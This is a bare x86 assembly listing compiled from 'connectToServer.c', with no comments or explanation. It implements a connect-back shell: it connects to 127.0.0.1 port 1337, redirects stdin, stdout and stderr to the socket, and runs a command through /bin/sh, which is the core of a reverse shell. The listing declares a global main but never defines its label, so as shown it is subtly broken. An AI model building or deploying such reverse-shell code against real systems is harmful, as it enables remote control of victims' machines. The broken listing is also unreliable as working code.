	.file	"connectToServer.c"
	.intel_syntax noprefix
	.section	.rodata
.LC0:
	.string	"127.0.0.1"
.LC1:
	.string	"ls"
.LC2:
	.string	"-c"
.LC3:
	.string	"/bin/sh"
	.text
	.globl	main
	.type	main, @function

.LFB2:
	.cfi_startproc
	lea	ecx, [esp+4]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR [ecx-4]
	push	ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	mov	ebp, esp
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
	sub	esp, 52
	mov	eax, ecx
	mov	eax, DWORD PTR [eax+4]
	mov	DWORD PTR [ebp-44], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR [ebp-12], eax
	xor	eax, eax
	mov	WORD PTR [ebp-28], 2
	sub	esp, 12
	push	OFFSET FLAT:.LC0
	call	inet_addr
	add	esp, 16
	mov	DWORD PTR [ebp-24], eax
	sub	esp, 12
	push	1337
	call	htons
	add	esp, 16
	mov	WORD PTR [ebp-26], ax
	sub	esp, 4
	push	0
	push	1
	push	2
	call	socket
	add	esp, 16
	mov	DWORD PTR [ebp-32], eax
	sub	esp, 4
	push	16
	lea	eax, [ebp-28]
	push	eax
	push	DWORD PTR [ebp-32]
	call	connect
	add	esp, 16
	sub	esp, 8
	push	0
	push	DWORD PTR [ebp-32]
	call	dup2
	add	esp, 16
	sub	esp, 8
	push	2
	push	DWORD PTR [ebp-32]
	call	dup2
	add	esp, 16
	sub	esp, 8
	push	1
	push	DWORD PTR [ebp-32]
	call	dup2
	add	esp, 16
	sub	esp, 4
	push	OFFSET FLAT:.LC1
	push	OFFSET FLAT:.LC2
	push	OFFSET FLAT:.LC3
	call	execl
	add	esp, 16
	mov	eax, 0
	mov	edx, DWORD PTR [ebp-12]
	xor	edx, DWORD PTR gs:20
	je	.L3
	call	__stack_chk_fail
.L3:
	mov	ecx, DWORD PTR [ebp-4]
	.cfi_def_cfa 1, 0
	leave
	.cfi_restore 5
	lea	esp, [ecx-4]
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
